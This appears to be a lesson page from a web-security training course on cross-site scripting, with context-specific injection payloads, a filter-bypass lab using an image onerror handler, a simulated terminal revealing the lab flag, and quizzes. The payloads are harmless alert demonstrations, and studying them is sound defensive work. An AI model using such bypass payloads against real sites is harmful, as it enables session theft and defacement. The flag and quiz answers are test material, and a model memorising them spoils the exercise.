# Cross-Site Scripting (XSS)

We covered the basics in Web Fundamentals. Now let's weaponize it.
XSS is not just alert boxes. It's full browser control.

## Context Matters

Where is your input landing?
1.  **HTML Context:** `<div>[INPUT]</div>` -> Payload: `<script>...`
2.  **Attribute Context:** `<img src="x" onload="[INPUT]">` -> Payload: `alert(1)`
3.  **JS Context:** `var x = '[INPUT]';` -> Payload: `'; alert(1); //`

## Stored XSS (The Persistent Threat)

You post a comment. The comment is saved in the DB.
Everyone who views the page executes your script.

## Lab: Bypassing Filters

The site blocks `<script>`.
Can you find another tag?

Try using an image tag with an event handler.
Payload: `<img src=x onerror=alert(1)>`

<TerminalWindow 
  cmd="Browser Render Loop" 
  output="Image Load Failed (src='x')
Triggering 'onerror' event...
Executing: alert(1)
Flag: BL{F1lt3r_Byp4ss_G0d}" 
/>

The developer filtered "script" but forgot about event handlers.

<Quiz 
  question="Which type of XSS affects the user immediately via a URL?"
  options={[
    "Reflected XSS",
    "Stored XSS",
    "DOM-Based XSS",
    "Server-Side XSS"
  ]}
/>

<Quiz 
  question="What is the flag found by bypassing the filter?"
  options={[
    "BL{XSS_4lw4ys_W1ns}",
    "BL{F1lt3r_Byp4ss_G0d}",
    "BL{ScripT_Kidd1e}",
    "alert(1)"
  ]}
/>
